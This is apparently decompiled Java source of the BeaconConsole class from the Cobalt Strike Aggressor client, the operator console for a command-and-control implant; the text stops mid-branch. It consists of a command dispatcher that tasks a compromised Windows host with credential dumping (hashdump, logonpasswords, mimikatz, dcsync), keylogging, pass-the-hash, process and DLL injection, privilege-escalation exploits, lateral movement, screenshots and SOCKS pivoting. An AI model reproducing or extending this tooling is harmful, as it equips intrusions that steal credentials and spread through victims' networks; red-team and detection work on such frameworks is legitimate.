package aggressor.windows;

import aggressor.AggressorClient;
import aggressor.DataManager;
import aggressor.DataUtils;
import aggressor.WindowCleanup;
import aggressor.dialogs.ScListenerChooser;
import beacon.BeaconCommands;
import beacon.BeaconElevators;
import beacon.BeaconExploits;
import beacon.BeaconRemoteExecMethods;
import beacon.BeaconRemoteExploits;
import beacon.BeaconTabCompletion;
import beacon.Registry;
import beacon.TaskBeacon;
import common.AObject;
import common.BeaconEntry;
import common.BeaconOutput;
import common.Callback;
import common.CommandParser;
import common.CommonUtils;
import common.StringStack;
import common.TeamQueue;
import console.ActivityConsole;
import console.Colors;
import console.Console;
import console.ConsolePopup;
import console.GenericTabCompletion;
import cortana.Cortana;
import dialog.SafeDialogCallback;
import dialog.SafeDialogs;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseEvent;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.Stack;
import javax.swing.JTextField;
import sleep.runtime.SleepUtils;

public class BeaconConsole extends AObject implements ActionListener, ConsolePopup, Callback {
   protected Console console;
   protected TeamQueue conn;
   protected Cortana engine;
   protected DataManager data;
   protected WindowCleanup state;
   protected String bid;
   protected TaskBeacon master;
   protected AggressorClient client;

   public BeaconConsole(String var1, AggressorClient var2) {
      this(var1, var2, var2.getData(), var2.getScriptEngine(), var2.getConnection());
   }

   public String getPrompt() {
      return Colors.underline("beacon") + "> ";
   }

   public String Script(String var1) {
      return "BEACON_" + var1;
   }

   public BeaconConsole(String var1, AggressorClient var2, DataManager var3, Cortana var4, TeamQueue var5) {
      this.console = null;
      this.conn = null;
      this.engine = null;
      this.data = null;
      this.state = null;
      this.master = null;
      this.client = null;
      this.engine = var4;
      this.conn = var5;
      this.data = var3;
      this.bid = var1;
      this.client = var2;
      this.master = new TaskBeacon(var2, var3, var5, new String[]{var1});
      this.console = new ActivityConsole(true);
      this.console.setBeaconID(var1);
      this.console.updatePrompt(this.getPrompt());
      this.console.getInput().addActionListener(this);
      StringBuffer var6 = new StringBuffer();
      Iterator var7 = DataUtils.getBeaconTranscriptAndSubscribe(var3, var1, this).iterator();

      while(var7.hasNext()) {
         String var8 = this.format((BeaconOutput)var7.next());
         if (var8 != null) {
            var6.append(var8 + "\n");
         }
      }

      this.console.append(var6.toString());
      var3.subscribe("beacons", this);
      BeaconEntry var11 = DataUtils.getBeacon(var3, var1);
      if (var11 != null) {
         String var9 = var4.format(this.Script("SBAR_LEFT"), var11.eventArguments());
         String var10 = var4.format(this.Script("SBAR_RIGHT"), var11.eventArguments());
         this.console.getStatusBar().set(var9, var10);
      }

      this.getTabCompletion();
      this.console.setPopupMenu(this);
   }

   public GenericTabCompletion getTabCompletion() {
      return new BeaconTabCompletion(this.bid, this.client, this.console);
   }

   public ActionListener cleanup() {
      return this.data.unsubOnClose("beacons, beaconlog", this);
   }

   public Console getConsole() {
      return this.console;
   }

   public void result(String var1, Object var2) {
      String var4;
      if (var1.equals("beacons") && this.console.isShowing()) {
         BeaconEntry var6 = DataUtils.getBeaconFromResult(var2, this.bid);
         if (var6 == null) {
            return;
         }

         var4 = this.engine.format(this.Script("SBAR_LEFT"), var6.eventArguments());
         String var5 = this.engine.format(this.Script("SBAR_RIGHT"), var6.eventArguments());
         this.console.getStatusBar().left(var4);
         this.console.getStatusBar().right(var5);
      } else if (var1.equals("beaconlog")) {
         BeaconOutput var3 = (BeaconOutput)var2;
         if (var3.is(this.bid)) {
            var4 = this.format(var3);
            if (var4 != null) {
               this.console.append(var4 + "\n");
            }
         }
      }

   }

   public String format(BeaconOutput var1) {
      return this.engine.format(var1.eventName().toUpperCase(), var1.eventArguments());
   }

   public void showPopup(String var1, MouseEvent var2) {
      Stack var3 = new Stack();
      LinkedList var4 = new LinkedList();
      var4.add(this.bid);
      var3.push(SleepUtils.getArrayWrapper(var4));
      this.engine.getMenuBuilder().installMenu(var2, "beacon", var3);
   }

   public String formatLocal(BeaconOutput var1) {
      var1.from = DataUtils.getNick(this.data);
      return this.format(var1);
   }

   public boolean isVistaAndLater() {
      BeaconEntry var1 = DataUtils.getBeacon(this.data, this.bid);
      if (var1 != null) {
         return var1.getVersion() >= 6.0;
      } else {
         return false;
      }
   }

   public boolean is8AndLater() {
      BeaconEntry var1 = DataUtils.getBeacon(this.data, this.bid);
      if (var1 != null) {
         return var1.getVersion() >= 6.2;
      } else {
         return false;
      }
   }

   public void actionPerformed(ActionEvent var1) {
      String var2 = var1.getActionCommand().trim();
      ((JTextField)var1.getSource()).setText("");
      CommandParser var3 = new CommandParser(var2);
      if (this.client.getAliases().isAlias(var3.getCommand())) {
         this.master.input(var2);
         this.client.getAliases().fireCommand(this.bid, var3.getCommand(), var3.getArguments());
      } else {
         final String var4;
         if (!var3.is("help") && !var3.is("?")) {
            if (var3.is("downloads")) {
               this.console.append(this.formatLocal(BeaconOutput.Input(this.bid, var2)) + "\n");
               this.conn.call("beacons.downloads", CommonUtils.args(this.bid), new Callback() {
                  public void result(String var1, Object var2) {
                     Stack var3 = new Stack();
                     var3.push(CommonUtils.convertAll(var2));
                     var3.push(SleepUtils.getScalar(BeaconConsole.this.bid));
                     BeaconConsole.this.console.append(BeaconConsole.this.engine.format("BEACON_OUTPUT_DOWNLOADS", var3) + "\n");
                  }
               });
            } else if (var3.is("elevate") && var3.empty()) {
               this.console.append(this.formatLocal(BeaconOutput.Input(this.bid, var2)) + "\n");
               this.console.append(this.engine.format("BEACON_OUTPUT_EXPLOITS", new Stack()) + "\n");
            } else if (var3.is("runasadmin") && var3.empty()) {
               this.console.append(this.formatLocal(BeaconOutput.Input(this.bid, var2)) + "\n");
               this.console.append(this.engine.format("BEACON_OUTPUT_ELEVATORS", new Stack()) + "\n");
            } else if (var3.is("remote-exec") && var3.empty()) {
               this.console.append(this.formatLocal(BeaconOutput.Input(this.bid, var2)) + "\n");
               this.console.append(this.engine.format("BEACON_OUTPUT_REMOTE_EXEC_METHODS", new Stack()) + "\n");
            } else if (var3.is("jump") && var3.empty()) {
               this.console.append(this.formatLocal(BeaconOutput.Input(this.bid, var2)) + "\n");
               this.console.append(this.engine.format("BEACON_OUTPUT_REMOTE_EXPLOITS", new Stack()) + "\n");
            } else {
               this.master.input(var2);
               final String var10;
               if (var3.is("argue")) {
                  if (!this.isVistaAndLater()) {
                     var3.error("Target is not Windows Vista or later");
                  } else if (!var3.verify("AZ") && !var3.reset()) {
                     if (!var3.verify("A") && !var3.reset()) {
                        this.master.SpoofArgsList();
                     } else {
                        var4 = var3.popString();
                        this.master.SpoofArgsRemove(var4);
                     }
                  } else {
                     var4 = var3.popString();
                     var10 = var3.popString();
                     this.master.SpoofArgsAdd(var10, var4);
                  }
               } else if (var3.is("blockdlls")) {
                  if (!this.is8AndLater()) {
                     var3.error("Target is not Windows 8 or later");
                  } else if (var3.empty()) {
                     this.master.BlockDLLs(true);
                  } else if (var3.verify("?")) {
                     this.master.BlockDLLs(var3.popBoolean());
                  }
               } else {
                  final int var12;
                  if (var3.is("browserpivot")) {
                     if (!var3.verify("IX") && !var3.reset()) {
                        if (!var3.verify("I") && !var3.reset()) {
                           if (var3.verify("?") && !var3.popBoolean()) {
                              this.master.BrowserPivotStop();
                           }
                        } else {
                           this.master.BrowserPivot(var3.popInt(), "x86");
                        }
                     } else {
                        var4 = var3.popString();
                        var12 = var3.popInt();
                        this.master.BrowserPivot(var12, var4);
                     }
                  } else if (var3.is("cancel")) {
                     if (var3.verify("Z")) {
                        this.master.Cancel(var3.popString());
                     }
                  } else if (var3.is("cd")) {
                     if (var3.verify("Z")) {
                        this.master.Cd(var3.popString());
                     }
                  } else if (var3.is("checkin")) {
                     this.master.Checkin();
                  } else if (var3.is("clear")) {
                     this.master.Clear();
                  } else {
                     final int var11;
                     if (var3.is("connect")) {
                        if (!var3.verify("AI") && !var3.reset()) {
                           if (var3.verify("Z")) {
                              var4 = var3.popString();
                              this.master.Connect(var4);
                           }
                        } else {
                           var11 = var3.popInt();
                           var10 = var3.popString();
                           this.master.Connect(var10, var11);
                        }
                     } else {
                        BeaconEntry var13;
                        final String var14;
                        if (var3.is("covertvpn")) {
                           var13 = DataUtils.getBeacon(this.data, this.bid);
                           if (var3.verify("AA")) {
                              var10 = var3.popString();
                              var14 = var3.popString();
                              this.master.CovertVPN(var14, var10);
                           } else if (var3.isMissingArguments() && var3.verify("A")) {
                              var10 = var3.popString();
                              this.master.CovertVPN(var10, var13.getInternal());
                           }
                        } else if (var3.is("cp")) {
                           if (var3.verify("AZ")) {
                              var4 = var3.popString();
                              var10 = var3.popString();
                              this.master.Copy(var10, var4);
                           }
                        } else if (var3.is("dcsync")) {
                           if (var3.verify("AA")) {
                              var4 = var3.popString();
                              var10 = var3.popString();
                              this.master.DcSync(var10, var4);
                           } else if (var3.isMissingArguments() && var3.verify("A")) {
                              var4 = var3.popString();
                              this.master.DcSync(var4);
                           }
                        } else {
                           int var15;
                           if (var3.is("desktop")) {
                              if (!var3.verify("IXQ") && !var3.reset()) {
                                 if (!var3.verify("IX") && !var3.reset()) {
                                    if (!var3.verify("IQ") && !var3.reset()) {
                                       if (!var3.verify("I") && !var3.reset()) {
                                          if (var3.verify("Q")) {
                                             var4 = var3.popString();
                                             this.master.Desktop(var4.equals("high"));
                                          } else if (var3.isMissingArguments()) {
                                             this.master.Desktop(true);
                                          }
                                       } else {
                                          var11 = var3.popInt();
                                          this.master.Desktop(var11, "x86", true);
                                       }
                                    } else {
                                       var4 = var3.popString();
                                       var12 = var3.popInt();
                                       this.master.Desktop(var12, "x86", var4.equals("high"));
                                    }
                                 } else {
                                    var4 = var3.popString();
                                    var12 = var3.popInt();
                                    this.master.Desktop(var12, var4, true);
                                 }
                              } else {
                                 var4 = var3.popString();
                                 var10 = var3.popString();
                                 var15 = var3.popInt();
                                 this.master.Desktop(var15, var10, var4.equals("high"));
                              }
                           } else if (var3.is("dllinject")) {
                              if (var3.verify("IF")) {
                                 var4 = var3.popString();
                                 var12 = var3.popInt();
                                 this.master.DllInject(var12, var4);
                              } else if (var3.isMissingArguments() && var3.verify("I")) {
                                 var11 = var3.popInt();
                                 SafeDialogs.openFile("Select Reflective DLL", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                    public void dialogResult(String var1) {
                                       BeaconConsole.this.master.DllInject(var11, var1);
                                    }
                                 });
                              }
                           } else if (var3.is("dllload")) {
                              if (var3.verify("IZ")) {
                                 var4 = var3.popString();
                                 var12 = var3.popInt();
                                 this.master.DllLoad(var12, var4);
                              }
                           } else if (var3.is("download")) {
                              if (var3.verify("Z")) {
                                 this.master.Download(var3.popString());
                              }
                           } else if (var3.is("drives")) {
                              this.master.Drives();
                           } else {
                              ScListenerChooser var16;
                              if (var3.is("elevate")) {
                                 BeaconExploits var22 = DataUtils.getBeaconExploits(this.data);
                                 if (var3.verify("AL")) {
                                    var10 = var3.popString();
                                    var14 = var3.popString();
                                    if (var22.isExploit(var14)) {
                                       this.master.Elevate(var14, var10);
                                    } else {
                                       var3.error("no such exploit '" + var14 + "'");
                                    }
                                 } else if (var3.isMissingArguments() && var3.verify("A")) {
                                    var10 = var3.popString();
                                    if (var22.isExploit(var10)) {
                                       var16 = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
                                          public void dialogResult(String var1) {
                                             BeaconConsole.this.master.Elevate(var10, var1);
                                          }
                                       });
                                       var16.show();
                                    } else {
                                       var3.error("no such exploit '" + var10 + "'");
                                    }
                                 }
                              } else if (var3.is("execute")) {
                                 if (var3.verify("Z")) {
                                    this.master.Execute(var3.popString());
                                 }
                              } else if (var3.is("execute-assembly")) {
                                 if (var3.verify("pZ")) {
                                    var4 = var3.popString();
                                    var10 = var3.popString();
                                    this.master.ExecuteAssembly(var10, var4);
                                 } else if (var3.isMissingArguments() && var3.verify("F")) {
                                    var4 = var3.popString();
                                    this.master.ExecuteAssembly(var4, "");
                                 }
                              } else if (var3.is("exit")) {
                                 this.master.Die();
                              } else if (var3.is("getprivs")) {
                                 this.master.GetPrivs();
                              } else if (var3.is("getsystem")) {
                                 this.master.GetSystem();
                              } else if (var3.is("getuid")) {
                                 this.master.GetUID();
                              } else if (var3.is("hashdump")) {
                                 var13 = DataUtils.getBeacon(this.data, this.bid);
                                 if (!var13.isAdmin()) {
                                    var3.error("this command requires administrator privileges");
                                 } else {
                                    this.master.Hashdump();
                                 }
                              } else {
                                 ScListenerChooser var25;
                                 if (var3.is("inject")) {
                                    if (!var3.verify("IXL") && !var3.reset()) {
                                       if (!var3.verify("IX") && !var3.reset()) {
                                          if (var3.verify("IL")) {
                                             var4 = var3.popString();
                                             var12 = var3.popInt();
                                             this.master.Inject(var12, var4, "x86");
                                          } else if (var3.isMissingArguments() && var3.verify("I")) {
                                             var11 = var3.popInt();
                                             var25 = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
                                                public void dialogResult(String var1) {
                                                   BeaconConsole.this.master.Inject(var11, var1, "x86");
                                                }
                                             });
                                             var25.show();
                                          }
                                       } else {
                                          var4 = var3.popString();
                                          var12 = var3.popInt();
                                          var16 = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
                                             public void dialogResult(String var1) {
                                                BeaconConsole.this.master.Inject(var12, var1, var4);
                                             }
                                          });
                                          var16.show();
                                       }
                                    } else {
                                       var4 = var3.popString();
                                       var10 = var3.popString();
                                       var15 = var3.popInt();
                                       this.master.Inject(var15, var4, var10);
                                    }
                                 } else if (var3.is("inline")) {
                                    if (var3.verify("Z")) {
                                       this.master.InlineExecute(var3.popString());
                                    }
                                 } else if (var3.is("jobkill")) {
                                    if (var3.verify("I")) {
                                       var11 = var3.popInt();
                                       this.master.JobKill(var11);
                                    }
                                 } else if (var3.is("jobs")) {
                                    this.master.Jobs();
                                 } else {
                                    String var7;
                                    if (var3.is("jump")) {
                                       BeaconRemoteExploits var26 = DataUtils.getBeaconRemoteExploits(this.data);
                                       if (var3.verify("AAL")) {
                                          var10 = var3.popString();
                                          var14 = var3.popString();
                                          var7 = var3.popString();
                                          if (var26.isExploit(var7)) {
                                             this.master.Jump(var7, var14, var10);
                                          } else {
                                             var3.error("no such exploit '" + var7 + "'");
                                          }
                                       } else if (var3.isMissingArguments() && var3.verify("AA")) {
                                          var10 = var3.popString();
                                          var14 = var3.popString();
                                          if (var26.isExploit(var14)) {
                                             ScListenerChooser var17 = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
                                                public void dialogResult(String var1) {
                                                   BeaconConsole.this.master.Jump(var14, var10, var1);
                                                }
                                             });
                                             var17.show();
                                          } else {
                                             var3.error("no such exploit '" + var14 + "'");
                                          }
                                       }
                                    } else if (var3.is("kerberos_ticket_purge")) {
                                       this.master.KerberosTicketPurge();
                                    } else if (var3.is("kerberos_ccache_use") && var3.empty()) {
                                       SafeDialogs.openFile("Select ticket to use", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                          public void dialogResult(String var1) {
                                             BeaconConsole.this.master.KerberosCCacheUse(var1);
                                          }
                                       });
                                    } else if (var3.is("kerberos_ccache_use")) {
                                       if (var3.verify("F")) {
                                          this.master.KerberosCCacheUse(var3.popString());
                                       }
                                    } else if (var3.is("kerberos_ticket_use") && var3.empty()) {
                                       SafeDialogs.openFile("Select ticket to use", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                          public void dialogResult(String var1) {
                                             BeaconConsole.this.master.KerberosTicketUse(var1);
                                          }
                                       });
                                    } else if (var3.is("kerberos_ticket_use")) {
                                       if (var3.verify("F")) {
                                          this.master.KerberosTicketUse(var3.popString());
                                       }
                                    } else if (var3.is("keylogger")) {
                                       if (var3.empty()) {
                                          this.master.KeyLogger();
                                       } else if (!var3.verify("IX") && !var3.reset()) {
                                          if (var3.verify("I")) {
                                             this.master.KeyLogger(var3.popInt(), "x86");
                                          }
                                       } else {
                                          var4 = var3.popString();
                                          var12 = var3.popInt();
                                          this.master.KeyLogger(var12, var4);
                                       }
                                    } else if (var3.is("kill")) {
                                       if (var3.verify("I")) {
                                          this.master.Kill(var3.popInt());
                                       }
                                    } else if (var3.is("link")) {
                                       if (!var3.verify("AA") && !var3.reset()) {
                                          if (var3.verify("Z")) {
                                             var4 = var3.popString();
                                             var10 = DataUtils.getDefaultPipeName(this.client.getData(), var4);
                                             this.master.Link(var10);
                                          }
                                       } else {
                                          var4 = var3.popString();
                                          var10 = var3.popString();
                                          this.master.Link("\\\\" + var10 + "\\pipe\\" + var4);
                                       }
                                    } else if (var3.is("logonpasswords")) {
                                       var13 = DataUtils.getBeacon(this.data, this.bid);
                                       if (!var13.isAdmin()) {
                                          var3.error("this command requires administrator privileges");
                                       } else {
                                          this.master.LogonPasswords();
                                       }
                                    } else if (var3.is("ls")) {
                                       if (!var3.verify("Z") && !var3.reset()) {
                                          this.master.Ls(".");
                                       } else {
                                          this.master.Ls(var3.popString());
                                       }
                                    } else {
                                       String var8;
                                       if (var3.is("make_token")) {
                                          if (var3.verify("AZ")) {
                                             var4 = var3.popString();
                                             var10 = var3.popString();
                                             if (var10.indexOf("\\") == -1) {
                                                this.master.LoginUser(".", var10, var4);
                                             } else {
                                                StringStack var19 = new StringStack(var10, "\\");
                                                var7 = var19.shift();
                                                var8 = var19.shift();
                                                this.master.LoginUser(var7, var8, var4);
                                             }
                                          }
                                       } else if (var3.is("message")) {
                                          if (var3.verify("Z")) {
                                             this.master.Message(var3.popString());
                                          }
                                       } else if (var3.is("mimikatz")) {
                                          if (var3.verify("Z")) {
                                             this.master.Mimikatz(var3.popString());
                                          }
                                       } else if (var3.is("mkdir")) {
                                          if (var3.verify("Z")) {
                                             this.master.MkDir(var3.popString());
                                          }
                                       } else if (var3.is("mode")) {
                                          if (var3.verify("C")) {
                                             var4 = var3.popString();
                                             if (var4.equals("dns")) {
                                                this.master.ModeDNS();
                                             } else if (var4.equals("dns6")) {
                                                this.master.ModeDNS6();
                                             } else if (var4.equals("dns-txt")) {
                                                this.master.ModeDNS_TXT();
                                             } else if (var4.equals("http")) {
                                                this.master.ModeHTTP();
                                             }
                                          }
                                       } else if (var3.is("mv")) {
                                          if (var3.verify("AZ")) {
                                             var4 = var3.popString();
                                             var10 = var3.popString();
                                             this.master.Move(var10, var4);
                                          }
                                       } else if (var3.is("net")) {
                                          if (var3.verify("VZ")) {
                                             var3.popString();
                                             var4 = var3.popString();
                                             var3.reset();
                                             if (CommonUtils.contains("computers, dclist, domain_controllers, domain_trusts, view", var4)) {
                                                var3.verify("VZ");
                                                var10 = var3.popString();
                                                var14 = var3.popString();
                                                this.master.NetView(var14, var10, (String)null);
                                             } else if (CommonUtils.contains("group, localgroup, user", var4)) {
                                                if (var3.verify("VAZ")) {
                                                   var3.reset();
                                                   if (var3.verify("VUZ")) {
                                                      var10 = var3.popString();
                                                      var14 = var3.popString();
                                                      var7 = var3.popString();
                                                      this.master.NetView(var7, var14, var10);
                                                   }
                                                } else if (var3.isMissingArguments() && var3.verify("VZ")) {
                                                   var3.reset();
                                                   if (!var3.verify("VU") && !var3.reset()) {
                                                      if (var3.verify("VZ")) {
                                                         var10 = var3.popString();
                                                         var14 = var3.popString();
                                                         this.master.NetView(var14, "localhost", var10);
                                                      }
                                                   } else {
                                                      var10 = var3.popString();
                                                      var14 = var3.popString();
                                                      this.master.NetView(var14, var10, (String)null);
                                                   }
                                                }
                                             } else if (CommonUtils.contains("share, sessions, logons, time", var4) && var3.verify("VU")) {
                                                var10 = var3.popString();
                                                var14 = var3.popString();
                                                this.master.NetView(var14, var10, (String)null);
                                             }
                                          } else if (var3.isMissingArguments() && var3.verify("V")) {
                                             var4 = var3.popString();
                                             if (CommonUtils.contains("computers, dclist, domain_controllers, domain_trusts, view", var4)) {
                                                this.master.NetView(var4, (String)null, (String)null);
                                             } else {
                                                this.master.NetView(var4, "localhost", (String)null);
                                             }
                                          }
                                       } else if (var3.is("note")) {
                                          if (var3.verify("Z")) {
                                             var4 = var3.popString();
                                             this.master.Note(var4);
                                          } else if (var3.isMissingArguments()) {
                                             this.master.Note("");
                                          }
                                       } else if (var3.is("portscan")) {
                                          if (var3.verify("TRDI")) {
                                             var11 = var3.popInt();
                                             var10 = var3.popString();
                                             var14 = var3.popString();
                                             var7 = var3.popString();
                                             this.master.PortScan(var7, var14, var10, var11);
                                          } else if (var3.isMissingArguments() && var3.verify("TRD")) {
                                             var4 = var3.popString();
                                             var10 = var3.popString();
                                             var14 = var3.popString();
                                             this.master.PortScan(var14, var10, var4, 1024);
                                          } else if (var3.isMissingArguments() && var3.verify("TR")) {
                                             var4 = var3.popString();
                                             var10 = var3.popString();
                                             this.master.PortScan(var10, var4, "icmp", 1024);
                                          } else if (var3.isMissingArguments() && var3.verify("T")) {
                                             var4 = var3.popString();
                                             this.master.PortScan(var4, "1-1024,3389,5900-6000", "icmp", 1024);
                                          }
                                       } else if (var3.is("powerpick")) {
                                          if (var3.verify("Z")) {
                                             this.master.PowerShellUnmanaged(var3.popString());
                                          }
                                       } else if (var3.is("powershell")) {
                                          if (var3.verify("Z")) {
                                             this.master.PowerShell(var3.popString());
                                          }
                                       } else if (var3.is("powershell-import") && var3.empty()) {
                                          SafeDialogs.openFile("Select script to import", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                             public void dialogResult(String var1) {
                                                BeaconConsole.this.master.PowerShellImport(var1);
                                             }
                                          });
                                       } else if (var3.is("powershell-import")) {
                                          if (var3.verify("f")) {
                                             this.master.PowerShellImport(var3.popString());
                                          }
                                       } else if (var3.is("ppid")) {
                                          if (!this.isVistaAndLater()) {
                                             var3.error("Target is not Windows Vista or later");
                                          } else if (var3.verify("I")) {
                                             this.master.PPID(var3.popInt());
                                          } else if (var3.isMissingArguments()) {
                                             this.master.PPID(0);
                                          }
                                       } else if (var3.is("ps")) {
                                          this.master.Ps();
                                       } else if (var3.is("psinject")) {
                                          if (var3.verify("IXZ")) {
                                             var4 = var3.popString();
                                             var10 = var3.popString();
                                             var15 = var3.popInt();
                                             this.master.PsInject(var15, var10, var4);
                                          }
                                       } else {
                                          String var9;
                                          StringStack var18;
                                          if (var3.is("pth")) {
                                             var13 = DataUtils.getBeacon(this.data, this.bid);
                                             if (!var13.isAdmin()) {
                                                var3.error("this command requires administrator privileges");
                                             } else if (var3.verify("AH")) {
                                                var10 = var3.popString();
                                                var14 = var3.popString();
                                                if (var14.indexOf("\\") == -1) {
                                                   this.master.PassTheHash(".", var14, var10);
                                                } else {
                                                   var18 = new StringStack(var14, "\\");
                                                   var8 = var18.shift();
                                                   var9 = var18.shift();
                                                   this.master.PassTheHash(var8, var9, var10);
                                                }
                                             }
                                          } else if (var3.is("pwd")) {
                                             this.master.Pwd();
                                          } else if (var3.is("reg")) {
                                             if (var3.verify("gXZ")) {
                                                var4 = var3.popString();
                                                var10 = var3.popString();
                                                var14 = var3.popString();
                                                Registry var20 = new Registry(var10, var4, "queryv".equals(var14));
                                                if (!var20.isValid()) {
                                                   var3.error(var20.getError());
                                                } else if ("queryv".equals(var14)) {
                                                   this.master.RegQueryValue(var20);
                                                } else if ("query".equals(var14)) {
                                                   this.master.RegQuery(var20);
                                                }
                                             }
                                          } else if (var3.is("remote-exec")) {
                                             BeaconRemoteExecMethods var27 = DataUtils.getBeaconRemoteExecMethods(this.data);
                                             if (var3.verify("AAZ")) {
                                                var10 = var3.popString();
                                                var14 = var3.popString();
                                                var7 = var3.popString();
                                                if (var27.isRemoteExecMethod(var7)) {
                                                   this.master.RemoteExecute(var7, var14, var10);
                                                } else {
                                                   var3.error("no such method '" + var7 + "'");
                                                }
                                             }
                                          } else if (var3.is("rev2self")) {
                                             this.master.Rev2Self();
                                          } else if (var3.is("rm")) {
                                             if (var3.verify("Z")) {
                                                this.master.Rm(var3.popString());
                                             }
                                          } else if (var3.is("rportfwd")) {
                                             if (!var3.verify("IAI") && !var3.reset()) {
                                                if (var3.verify("AI")) {
                                                   var11 = var3.popInt();
                                                   var10 = var3.popString();
                                                   if (!"stop".equals(var10)) {
                                                      var3.error("only acceptable argument is stop");
                                                   } else {
                                                      this.master.PortForwardStop(var11);
                                                   }
                                                }
                                             } else {
                                                var11 = var3.popInt();
                                                var10 = var3.popString();
                                                var15 = var3.popInt();
                                                this.master.PortForward(var15, var10, var11);
                                             }
                                          } else if (var3.is("run")) {
                                             if (var3.verify("Z")) {
                                                this.master.Run(var3.popString());
                                             }
                                          } else if (var3.is("runas")) {
                                             if (var3.verify("AAZ")) {
                                                var4 = var3.popString();
                                                var10 = var3.popString();
                                                var14 = var3.popString();
                                                if (var14.indexOf("\\") == -1) {
                                                   this.master.RunAs(".", var14, var10, var4);
                                                } else {
                                                   var18 = new StringStack(var14, "\\");
                                                   var8 = var18.shift();
                                                   var9 = var18.shift();
                                                   this.master.RunAs(var8, var9, var10, var4);
                                                }
                                             }
                                          } else if (var3.is("runasadmin")) {
                                             BeaconElevators var28 = DataUtils.getBeaconElevators(this.data);
                                             if (var3.verify("AZ")) {
                                                var10 = var3.popString();
                                                var14 = var3.popString();
                                                if (var28.isElevator(var14)) {
                                                   this.master.ElevateCommand(var14, var10);
                                                } else {
                                                   var3.error("no such exploit '" + var14 + "'");
                                                }
                                             }
                                          } else if (var3.is("runu")) {
                                             if (!this.isVistaAndLater()) {
                                                var3.error("Target is not Windows Vista or later");
                                             } else if (var3.verify("IZ")) {
                                                var4 = var3.popString();
                                                var12 = var3.popInt();
                                                this.master.RunUnder(var12, var4);
                                             }
                                          } else if (var3.is("screenshot")) {
                                             if (!var3.verify("IXI") && !var3.reset()) {
                                                if (!var3.verify("IX") && !var3.reset()) {
                                                   if (!var3.verify("II") && !var3.reset()) {
                                                      if (!var3.verify("I") && !var3.reset()) {
                                                         this.master.Screenshot(0);
                                                      } else {
                                                         var11 = var3.popInt();
                                                         this.master.Screenshot(var11, "x86", 0);
                                                      }
                                                   } else {
                                                      var11 = var3.popInt();
                                                      var12 = var3.popInt();
                                                      this.master.Screenshot(var12, "x86", var11);
                                                   }
                                                } else {
                                                   var4 = var3.popString();
                                                   var12 = var3.popInt();
                                                   this.master.Screenshot(var12, var4, 0);
                                                }
                                             } else {
                                                var11 = var3.popInt();
                                                var10 = var3.popString();
                                                var15 = var3.popInt();
                                                this.master.Screenshot(var15, var10, var11);
                                             }
                                          } else if (var3.is("setenv")) {
                                             if (var3.verify("AZ")) {
                                                var4 = var3.popString();
                                                var10 = var3.popString();
                                                this.master.SetEnv(var10, var4);
                                             } else if (var3.isMissingArguments() && var3.verify("A")) {
                                                var4 = var3.popString();
                                                this.master.SetEnv(var4, (String)null);
                                             }
                                          } else if (var3.is("shell")) {
                                             if (var3.verify("Z")) {
                                                this.master.Shell(var3.popString());
                                             }
                                          } else if (var3.is("sleep")) {
                                             if (!var3.verify("I%") && !var3.reset()) {
                                                if (var3.verify("I")) {
                                                   this.master.Sleep(var3.popInt(), 0);
                                                }
                                             } else {
                                                var11 = var3.popInt();
                                                var12 = var3.popInt();
                                                this.master.Sleep(var12, var11);
                                             }
                                          } else if (var3.is("socks")) {
                                             if (!var3.verify("I") && !var3.reset()) {
                                                if (var3.verify("Z")) {
                                                   if (!var3.popString().equals("stop")) {
                                                      var3.error("only acceptable argument is stop or port");
                                                   } else {
                                                      this.master.SocksStop();
                                                   }
                                                }
                                             } else {
                                                this.master.SocksStart(var3.popInt());
                                             }
                                          } else if (var3.is("spawn")) {
                                             if (var3.empty()) {
                                                ScListenerChooser var29 = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
                                                   public void dialogResult(String var1) {
                                                      BeaconConsole.this.master.Spawn(var1);
                                                   }
                                                });
                                                var29.show();
                                             } else if (!var3.verify("XL") && !var3.reset()) {
                                                if (!var3.verify("X") && !var3.reset()) {
                                                   if (var3.verify("L")) {
                                                      this.master.Spawn(var3.popString());
                                                   }
                                                } else {
                                                   var4 = var3.popString();
                                                   var25 = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
                                                      public void dialogResult(String var1) {
                                                         BeaconConsole.this.master.Spawn(var1, var4);
                                                      }
                                                   });
                                                   var25.show();
                                                }
                                             } else {
                                                var4 = var3.popString();
                                                var10 = var3.popString();
                                                this.master.Spawn(var4, var10);
                                             }
                                          } else if (var3.is("spawnas")) {
                                             if (var3.verify("AAL")) {
                                                var4 = var3.popString();
                                                var10 = var3.popString();
                                                var14 = var3.popString();
                                                if (var14.indexOf("\\") == -1) {
                                                   this.master.SpawnAs(".", var14, var10, var4);
                                                } else {
                                                   var18 = new StringStack(var14, "\\");
                                                   var8 = var18.shift();
                                                   var9 = var18.shift();
                                                   this.master.SpawnAs(var8, var9, var10, var4);
                                                }
                                             } else if (var3.isMissingArguments() && var3.verify("AA")) {
                                                var4 = var3.popString();
                                                var10 = var3.popString();
                                                var16 = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
                                                   public void dialogResult(String var1) {
                                                      if (var10.indexOf("\\") == -1) {
                                                         BeaconConsole.this.master.SpawnAs(".", var10, var4, var1);
                                                      } else {
                                                         StringStack var2 = new StringStack(var10, "\\");
                                                         String var3 = var2.shift();
                                                         String var4x = var2.shift();
                                                         BeaconConsole.this.master.SpawnAs(var3, var4x, var4, var1);
                                                      }

                                                   }
                                                });
                                                var16.show();
                                             }
                                          } else if (var3.is("spawnu")) {
                                             if (var3.verify("IL")) {
                                                var4 = var3.popString();
                                                var12 = var3.popInt();
                                                this.master.SpawnUnder(var12, var4);
                                             } else if (var3.isMissingArguments() && var3.verify("I")) {
                                                var11 = var3.popInt();
                                                var25 = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
                                                   public void dialogResult(String var1) {
                                                      BeaconConsole.this.master.SpawnUnder(var11, var1);
                                                   }
                                                });
                                                var25.show();
                                             }
                                          } else if (var3.is("spawnto")) {
                                             if (var3.empty()) {
